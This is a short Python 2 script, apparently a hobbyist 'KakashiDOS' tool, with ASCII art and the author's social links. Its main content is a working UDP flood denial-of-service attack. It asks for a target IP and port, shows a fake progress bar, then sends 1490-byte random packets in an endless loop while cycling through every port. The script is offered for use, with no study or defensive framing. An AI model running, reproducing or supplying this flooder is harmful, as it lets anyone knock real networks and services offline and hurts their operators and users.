import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")
print "KakashiDOS"
print
print('                 /,   ,|   ,|')
print('             /| /(  ,` / ,//')
print('          \`( |/ /,`  (,/ |')
print('           \ \ ` `   `  /--,')
print('         _,_\ `  ` `  ``  /__')
print('          `-.____________`  /')
print('            [  \@,    :] `--,-..-')
print('            [__________]__,`-._/')
print('             )`o\ ` o) \/ )')
print('             \  /   __  ./')
print('              \=`   ==,\..')
print('               \ -. `,` (333')
print('               3`--``    \33.')
print('             ,333_) /mm33333:.')
print "|||||||||||||||||||||||||||||||||||||||||||||||||||"
print "github   :   https://github.com/d1m0nzs"
print "youtube  :   https://www.youtube.com/channel/UCjIZhdjbIx4mFVrvVfTjhnQ?"
print "instagram  :  https://www.instagram.com/d1m0nzs/?hl=en"
print "discord  :   Dimons#0001"
print "|||||||||||||||||||||||||||||||||||||||||||||||||||"
ip = raw_input("IP Target : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet Attack Starting")
print "[                    ] 0% "
time.sleep(1)
print "[=====               ] 23%"
time.sleep(1)
print "[==========          ] 57%"
time.sleep(1)
print "[===============     ] 79%"
time.sleep(1)
print "[=================== ] 96%"
time.sleep(1)
print "[====================] 100%"
time.sleep(2)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

